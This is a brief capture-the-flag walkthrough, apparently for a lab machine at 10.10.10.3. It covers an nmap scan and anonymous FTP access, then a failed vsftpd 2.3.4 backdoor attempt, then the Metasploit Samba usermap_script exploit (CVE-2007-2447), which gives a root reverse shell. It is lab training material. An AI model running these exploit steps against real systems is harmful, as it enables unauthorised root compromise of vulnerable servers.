-we run a nmap scan on the machine IP
```shell
nmap -sC 10.10.10.3
```

- we got the next ports open 
	- 21/tcp - ftp:
		- anonymous ftp login is allowed
	- 22/tcp - ssh: which is open
	- 139/tcp `netbios-ssn`
	- 445/tcp `microsoft-ds`
- OS - Unix ( Samba 3.0.20 - Debian)

- we login into ftp with 
```shell
ftp <IP_address>
```
- username : `anonymous`
- password: `230`

- we see that ftp is running on `vsftpd version 2.3.4`
```msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
```
- we try to use an exploit with metasploit to create a reverse shell but it does not work

- we search for exploits for the Samba 3.0.20 version
- we find CVE-2007-2447
- we start exploit with metasploit
```msfconsole
use exploit/multi/samba/usermap_script
```
- show options
- we set the RHOST option with the machine IP address
- show targets
- we set the TARGET to 0
- we set the LHOST option with our lab_vpn IP address

- we get a reverse shell as user root

- the user flag is in the user makis /home directory
- the root flag is in the /root directory 